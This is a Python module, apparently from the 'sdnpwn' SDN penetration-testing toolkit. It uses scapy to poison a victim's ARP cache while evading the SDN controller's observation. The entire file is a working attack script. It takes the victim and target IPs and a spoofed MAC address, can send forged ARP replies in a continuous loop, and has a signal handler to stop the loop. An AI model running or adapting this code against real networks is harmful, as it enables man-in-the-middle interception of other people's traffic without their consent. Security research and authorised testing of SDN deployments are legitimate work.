from scapy.all import *
import sys
from time import sleep
import signal

try:
  import modules.sdnpwn_common as sdnpwn
except:
  import sdnpwn_common as sdnpwn


def info():
  return "Poisons a targets ARP cache without the controller observing the attack. Relies on flows being installed for ARP traffic and this traffic not being sent to the controller by the flow."
  
def usage():
  
  sdnpwn.addUsage("-i | --iface", "Interface to use", True)
  sdnpwn.addUsage("-v | --victim", "IP address of victim", True)
  sdnpwn.addUsage("-vM| --victim-mac", "MAC address of victim")
  sdnpwn.addUsage("-t | --target-ip", "IP address to poisin in vicims ARP cache", True)
  sdnpwn.addUsage("-m | --mac", "MAC address to insert in the victims cache", True)
  sdnpwn.addUsage("-l | --loop", "Continue poisoning until stopped")
  sdnpwn.addUsage("-d | --delay", "Delay between packets when looping")
  
  return sdnpwn.getUsage()
  

def arpCachePoison(interface, vicIP, vicMAC, targetIP, newMac, thisHostIP, thisHostMAC, loop, loopDelay):
  global poisoningComplete
  global haltPoisoning
  poisoningComplete = False
  haltPoisoning = False
  
  sdnpwn.message("Sending gratuitous ARP for legitimate host to " + vicIP, sdnpwn.NORMAL)
  sendp(Ether(src=thisHostMAC, dst=vicMAC)/ARP(hwsrc=thisHostMAC, pdst=thisHostIP))
  sleep(2) #Need to wait to ensure that the flow has been installed on the switches
  sdnpwn.message("Poisoning target " + vicIP, sdnpwn.NORMAL)
  malARP = (Ether(src=thisHostMAC, dst=vicMAC)/ARP(op=ARP.is_at, psrc=targetIP,hwsrc=newMac, pdst=targetIP))
  if(loop == True):
    while(haltPoisoning == False):
      sendp(malARP)
      sleep(loopDelay)
      poisoningComplete = True
  else:
    sendp(malARP)
    poisoningComplete = True
    
def isPoisoningComplete():
  global poisoningComplete
  return poisoningComplete

def stopPoisoning():
  global haltPoisoning
  haltPoisoning = True
  
def signal_handler(signal, frame):
  sdnpwn.message("Stopping...", sdnpwn.NORMAL)
  stopPoisoning()
  
def run(params):
  global poisoningComplete
  global haltPoisoning
  poisoningComplete = False
  haltPoisoning = False
  
  signal.signal(signal.SIGINT, signal_handler)
  
  iface = sdnpwn.getArg(["--iface", "-i"], params)
  vIP = sdnpwn.getArg(["--victim", "-v"], params)
  vMac = sdnpwn.getArg(["--victim-mac", "-vM"], params)
  targetIP = sdnpwn.getArg(["--target-ip", "-t"], params)
  newMac = sdnpwn.getArg(["--mac", "-m"], params)
  loop = sdnpwn.checkArg(["--loop", "-l"], params)
  loopDelay = sdnpwn.getArg(["--delay", "-d"], params, 1)
    
  if(vMac == None):
    vMac = sdnpwn.getTargetMacAddress(iface, vIP)
    
  if(vIP == None or vMac == None or targetIP == None or newMac == None):
    print(info())
    print(usage())
    return
  
  thisHostIP = sdnpwn.getIPAddress(iface)
  thisHostMAC = sdnpwn.getMacAddress(iface)
  
  if((thisHostIP == '0') or (thisHostMAC == '0')):
    sdnpwn.message("Invalid interface", sdnpwn.ERROR)
    return
    
  arpCachePoison(iface, vIP, vMac, targetIP, newMac, thisHostIP, thisHostMAC, loop, loopDelay)
  
  
  
  
